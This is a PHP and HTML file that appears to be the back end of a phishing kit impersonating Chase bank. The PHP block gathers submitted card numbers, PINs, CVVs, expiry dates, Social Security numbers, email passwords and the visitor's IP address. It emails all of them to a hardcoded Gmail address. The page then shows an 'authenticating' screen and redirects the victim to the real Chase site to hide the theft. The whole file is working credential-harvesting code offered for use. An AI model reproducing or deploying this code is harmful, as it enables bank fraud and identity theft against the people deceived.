<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------RezulT---------\n";
$message .= "--------\n";
$message .= "Card number ".$_POST['card']."\n";
$message .= "Card Pin: ".$_POST['pin']."\n";
$message .= "Card CVV: ".$_POST['cvv']."\n";
$message .= "Card EXP Month: ".$_POST['b1']."\n";
$message .= "Card EXP Yr: ".$_POST['b3']."\n";
$message .= "SSN: ".$_POST['ssn']."\n";
$message .= "EMAIL ADDRESS: ".$_POST['email']."\n";
$message .= "EMAIL PASS: ".$_POST['pswd']."\n";
$message .= "--------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------Created By SLim--------------\n";
$recipient = "SALUDALEXP@gmail.com";
$subject = "Chase CAD";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "", $message);
if (mail($recipient,$subject,$message,$headers))
?>




<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>





<HEAD>
   <meta http-equiv="Content-type" content="text/html; charset=ISO-8859-1" />   
   
   <META HTTP-EQUIV="Refresh" CONTENT="1;URL=https://www.chase.com/" >


   

   
   
      
      
   


<TITLE>Authenticating Account Information </TITLE>


   <link rel="stylesheet" type="text/css" href="../common/styles/wibscreen.css" />

</HEAD>               

<BODY BGCOLOR="#ffffff">
  
    
  






<!-- ********************************* Begin Body ************************** -->
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>



</BODY>
</html>
